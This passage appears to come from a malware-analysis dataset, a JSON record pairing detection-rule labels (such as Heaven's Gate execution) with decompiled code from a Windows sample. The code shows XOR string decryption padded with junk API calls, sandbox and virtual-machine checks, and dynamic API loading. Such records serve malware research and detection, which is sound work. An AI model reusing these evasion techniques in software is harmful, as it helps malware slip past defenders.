var_11h = 0x1d;\n    var_10h = CONCAT31(var_10h._1_3_, 0x65);\n    var_50h = 0x48795936;\n    var_4ch._0_1_ = 0x65;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    iVar15 = &var_17h + (3 - iVar7);\n    var_a0h = iVar7;\n    var_9ch = iVar15;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar9 != 0x8deb50) {\n            *(iVar8 + iVar7) = *(&var_50h + iVar8 % var_54h) ^ (iVar8 + iVar7)[iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_12h = 5;\n    var_17h._3_1_ = 0x11;\n    var_13h = 0x14;\n    var_11h = 0x7f;\n    var_10h = var_10h & 0xffffff00 | 0x30;\n    var_8h = 0x36465942;\n    var_4h = CONCAT22(var_4h._2_2_, 0x3430);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    iVar15 = &var_17h + (3 - iVar7);\n    var_9ch = iVar7;\n    var_98h = iVar15;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar9 != 0xb52923) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_58h) ^ (iVar8 + iVar7)[iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_28h = 0x1122787b;\n    var_24h._0_1_ = 0x2b;\n    var_24h._1_1_ = 0x67;\n    var_24h._2_2_ = 0x1b12;\n    var_20h._0_1_ = 0x56;\n    var_20h._1_1_ = 0x62;\n    var_20h._2_2_ = 0x7357;\n    var_1ch = 2;\n    var_1bh._0_1_ = 6;\n    var_1bh._1_1_ = 0x46;\n    var_1bh._2_1_ = 100;\n    var_1bh._3_1_ = 0x67;\n    var_8h = 0x54763632;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4767);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_98h = iVar7;\n    var_94h = &var_28h - iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar8 != 0xcfe697) {\n            *(iVar15 + iVar7) = *(&var_8h + iVar15 % var_58h) ^ (iVar15 + iVar7)[&var_28h - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x11);\n    var_8h = 0x39173777;\n    var_4h = var_4h & 0xff000000 | 0x630048;\n    var_17h._3_1_ = 0x31;\n    var_13h = 99;\n    var_12h = 0x59;\n    var_11h = 0x6d;\n    var_10h = CONCAT31(var_10h._1_3_, 0x65);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_94h = iVar7;\n    var_48h = &var_8h - iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0x940d3) {\n            *(iVar15 + iVar7) = *(&var_17h + iVar15 % var_54h + 3) ^ (iVar15 + iVar7)[&var_8h - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 7);\n    var_50h = 0xe370637;\n    var_4ch._0_1_ = 0x73;\n    var_8h = 0x47794964;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7a73);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_48h = &var_50h - iVar7;\n    var_10h = iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar8 != 0x3f2f8e) {\n            *(iVar15 + iVar7) = *(&var_8h + iVar15 % var_58h) ^ (iVar15 + iVar7)[&var_50h - iVar7];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 5);\n    *0x41e200 = var_ach;\n    *0x41e208 = var_a8h;\n    *0x41e20c = var_a4h;\n    *0x41e210 = var_a0h;\n    *0x41e214 = var_9ch;\n    uVar13 = 0;\n    *0x41e218 = var_98h;\n    *0x41e21c = var_94h;\n    *0x41e220 = iVar7;\n    do {\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd8, *(uVar13 + 0x41e200));\n        if (iVar7 != 0) {\n            fcn.00404fc8();\n        }\n        uVar13 = uVar13 + 4;\n    } while (uVar13 < 0x20);\n    var_28h = 0x3d282612;\n    var_24h._0_1_ = 0x38;\n    var_24h._1_1_ = 0x11;\n    var_24h._2_2_ = 0x202d;\n    var_20h._0_1_ = 0x3f;\n    var_20h._1_1_ = 0xe;\n    var_20h._2_2_ = 0x2132;\n    var_1ch = 0x37;\n    var_1bh._0_1_ = 0x26;\n    var_1bh._1_1_ = 0x23;\n    var_1bh._2_1_ = 0x36;\n    var_1bh._3_1_ = 0x57;\n    var_8h = 0x584c4f44;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5357);\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_50h = iVar7;\n    var_48h = &var_28h - iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        puVar12 = extraout_ECX_00;\n        if (iVar8 != 0xb4cb91) {\n            puVar12 = iVar15 + iVar7;\n            *puVar12 = *(&var_8h + iVar15 % var_58h) ^ puVar12[&var_28h - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x11);\n    cVar3 = fcn.00403e76(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404fc8();\n    }\n    var_ch = 0x131c070f;\n    var_8h = 0x2c023839;\n    var_4h = var_4h & 0xff000000 | 0x593408;\n    var_60h = 0x676e6e59;\n    var_5ch._0_1_ = 0x4c;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_48h = &var_ch - iVar7;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar8 != 0xa9e4ad) {\n            *(iVar15 + iVar7) = *(&var_60h + iVar15 % var_54h) ^ (iVar15 + iVar7)[&var_ch - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0xb);\n    iVar15 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd8, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar15 != 0) {\n        fcn.00404fc8();\n    }\n    var_40h = 0x300d0b38;\n    var_3ch = 0x1391924;\n    var_38h = 0x3b1a2917;\n    var_34h = 0xb382b19;\n    var_30h = 0x13372c15;\n    var_2ch = 0x37170a22;\n    var_28h = 0x2717371c;\n    var_24h._0_1_ = 6;\n    var_24h._1_1_ = 0x2a;\n    var_24h._2_2_ = 0x2119;\n    var_20h._0_1_ = 0x25;\n    var_20h._1_1_ = 0x10;\n    var_20h._2_2_ = 0x3d25;\n    var_1ch = 0x19;\n    var_1bh._0_1_ = 0x37;\n    var_1bh._1_1_ = 0x22;\n    var_1bh._2_1_ = 0xb;\n    var_1bh._3_1_ = 0x1d;\n    var_17h._0_1_ = 0x58;\n    var_8h = 0x644b446b;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5873);\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_60h = iVar15;\n    var_48h = &var_40h - iVar15;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        puVar12 = extraout_ECX_01;\n        if (iVar9 != 0xc4c955) {\n            puVar12 = iVar8 + iVar15;\n            *puVar12 = *(&var_8h + iVar8 % var_58h) ^ puVar12[&var_40h - iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x2a);\n    cVar3 = fcn.00403e76(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404fc8();\n    }\n    var_30h = 0x40477174;\n    var_2ch = 0x70777879;\n    var_28h = 0x637f5a45;\n    var_24h._0_1_ = 0x76;\n    var_24h._1_1_ = 0x77;\n    var_24h._2_2_ = 0x4145;\n    var_20h._0_1_ = 0x79;\n    var_20h._1_1_ = 0x78;\n    var_20h._2_2_ = 0x7773;\n    var_1ch = 0x4c;\n    var_1bh._0_1_ = 0x42;\n    var_1bh._1_1_ = 0x7d;\n    var_1bh._2_1_ = 0x55;\n    var_8h = 0x77754441;\n    var_4h = CONCAT22(var_4h._2_2_, 0x554d);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_48h = &var_30h - iVar15;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar9 != 0x52ce9d) {\n            *(iVar8 + iVar15) = *(&var_8h + iVar8 % var_58h) ^ (iVar8 + iVar15)[&var_30h - iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd8, iVar15);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.00404fc8();\n    }\n    var_30h = 0x6b01505b;\n    var_2ch = 0x1504160;\n    var_28h = 0x575f7a67;\n    var_24h._0_1_ = 2;\n    var_24h._1_1_ = 100;\n    var_24h._2_2_ = 0x5f67;\n    var_20h._0_1_ = 0x51;\n    var_20h._1_1_ = 0x18;\n    var_20h._2_2_ = 0x6461;\n    var_1ch = 0x59;\n    var_1bh._0_1_ = 0x57;\n    var_1bh._1_1_ = 5;\n    var_1bh._2_1_ = 0x53;\n    var_8h = 0x5335666c;\n    var_4h = CONCAT31(var_4h._1_3_, 0x57);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_48h = &var_30h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar10 != 0xb67448) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_54h) ^ (iVar9 + iVar8)[&var_30h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd8, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 != 0) {\n        fcn.00404fc8();\n    }\n    var_30h = 0x4c7a4456;\n    var_2ch = 0x41526976;\n    var_28h = 0x70795979;\n    var_24h._0_1_ = 0x53;\n    var_24h._1_1_ = 0x4b;\n    var_24h._2_2_ = 0x4177;\n    var_20h._0_1_ = 0x74;\n    var_20h._1_1_ = 0x69;\n    var_20h._2_2_ = 0x4053;\n    var_1ch = 0x78;\n    var_1bh._0_1_ = 0x45;\n    var_1bh._1_1_ = 0x75;\n    var_1bh._2_1_ = 0x44;\n    var_8h = 0x744e7261;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4441);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_48h = &var_30h - iVar9;\n    do {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar11 != 0x6774c7) {\n            *(iVar10 + iVar9) = *(&var_8h + iVar10 % var_58h) ^ (iVar10 + iVar9)[&var_30h - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x18);\n    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd8, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar10 != 0) {\n        fcn.00404fc8();\n    }\n    uVar5 = (*pcVar2)(0, iVar9);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar15);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_10h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_44h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar13 = (*pcVar1)(uVar5);\n    return uVar13 & 0xffffff00;\n}\n",
        "token_count": 10161
    },
    "00404e22": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00404e22(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    ushort var_2ah;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h._0_2_ = 0x761;\n    var_28h._2_2_ = 0x2837;\n    var_24h._0_1_ = 0x3a;\n    var_24h._1_1_ = 7;\n    var_24h._2_2_ = 0x1079;\n    var_20h._0_2_ = 0x216;\n    var_20h._2_2_ = CONCAT11(var_20h._3_1_, 0x33);\n    var_18h = 0x7a745733;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x6e);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0x8bb385) {\n            var_4h = 5;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 5) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h._0_1_ = 0x3c;\n    var_4h = 6;\n    var_30h._1_1_ = 6;\n    stack0xffffffce = 0x26221c3f;\n    var_2ah = 0x120c;\n    var_28h._0_2_ = 0x1d22;\n    var_28h._2_2_ = 0x3132;\n    var_24h._0_1_ = 0x18;\n    var_24h._2_2_ = 0x1633;\n    var_20h._0_2_ = 0x3d15;\n    var_20h._2_2_ = 0x1f08;\n    var_1ch = 0x56;\n    var_18h = 0x78567369;\n    var_14h._0_2_ = 0x5461;\n    var_24h._1_1_ = var_30h._1_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xf0ec35) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1463
    },
    "0040b30d": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b30d(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h._0_1_ = 0;\n    var_18h._1_1_ = 0x27;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x19;\n    var_14h._0_1_ = 0xf;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0x27;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x3d;\n    var_ch._1_1_ = 0x12;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 0x1c;\n    var_8h._1_1_ = 0x5c;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x27;\n    var_4h._0_1_ = 0x1d;\n    var_4h._1_1_ = 0xe;\n    var_4h._2_1_ = 0x6a;\n    var_28h = 0x6b7a4253;\n    var_24h._0_2_ = 0x356a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_38h = 6;\n    iVar24 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar5 != 0x7f8b65) {\n            *(iVar24 + iVar4) = *(&var_28h + iVar24 % var_38h) ^ (iVar24 + iVar4)[&var_18h - iVar4];\n        }\n        iVar24 = iVar24 + 1;\n    } while (iVar24 < 0x17);\n    fcn.00409991();\n    var_20h = 0x15752b1e;\n    var_1ch._0_1_ = 0x3b;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x29;\n    var_1ch._3_1_ = 0x5a;\n    var_18h._0_1_ = 0x36;\n    var_18h._1_1_ = 0x3a;\n    var_18h._2_1_ = 0x24;\n    var_18h._3_1_ = 0x23;\n    var_14h._0_1_ = 0x55;\n    var_14h._1_1_ = 0x14;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0x19;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x5f;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x3c;\n    var_ch._2_1_ = 0x5d;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 0x21;\n    var_8h._1_1_ = 0x21;\n    var_8h._2_1_ = 0x2b;\n    var_8h._3_1_ = 0x53;\n    var_4h._0_1_ = 3;\n    var_4h._1_1_ = 0x48;\n    var_b0h = 0x66344e4d;\n    var_ach._0_1_ = 0x48;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    iVar5 = 0;\n    var_2ch = &var_20h - iVar24;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar6 != 0x78b959) {\n            *(iVar5 + iVar24) = *(&var_b0h + iVar5 % var_34h) ^ (iVar5 + iVar24)[&var_20h - iVar24];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.00409991();\n    var_18h._0_1_ = 0x22;\n    var_18h._1_1_ = 0x1d;\n    var_18h._2_1_ = 0x7d;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x11;\n    var_14h._1_1_ = 0x1a;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x54;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x61;\n    var_ch._1_1_ = 0x16;\n    var_ch._2_1_ = 0x1b;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x11;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 0x14;\n    var_4h._1_1_ = 0x78;\n    var_a8h = 0x64317871;\n    var_a4h._0_1_ = 0x72;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_b0h = iVar5;\n    var_2ch = &var_18h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar7 != 0x161349) {\n            *(iVar6 + iVar5) = *(&var_a8h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_18h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x16);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x12;\n    var_1ch._1_1_ = 0x3d;\n    var_1ch._2_1_ = 0x25;\n    var_1ch._3_1_ = 0x28;\n    var_18h._0_1_ = 0x34;\n    var_18h._1_1_ = 0x33;\n    var_18h._2_1_ = 0x3d;\n    var_18h._3_1_ = 0xd;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 0x2d;\n    var_10h._0_1_ = 3;\n    var_10h._1_1_ = 0x32;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x11;\n    var_ch._0_1_ = 0x2a;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x3e;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x3d;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 0x57;\n    var_a0h = 0x466c5841;\n    var_9ch._0_1_ = 0x57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_a8h = iVar5;\n    var_2ch = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar7 != 0xcd4580) {\n            *(iVar6 + iVar5) = *(&var_a0h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x19);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x1a;\n    var_1ch._1_1_ = 0x2b;\n    var_1ch._2_1_ = 0x1e;\n    var_1ch._3_1_ = 0x20;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x26;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x2d;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x2f;\n    var_10h._1_1_ = 7;\n    var_10h._2_1_ = 0x1c;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x3b;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x22;\n    var_4h._0_1_ = 0x17;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0x2b;\n    var_4h._3_1_ = 0x4b;\n    var_98h = 0x4e4b4e49;\n    var_94h._0_1_ = 0x72;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_a0h = iVar5;\n    var_2ch = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar7 != 0x75b9ff) {\n            *(iVar6 + iVar5) = *(&var_98h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    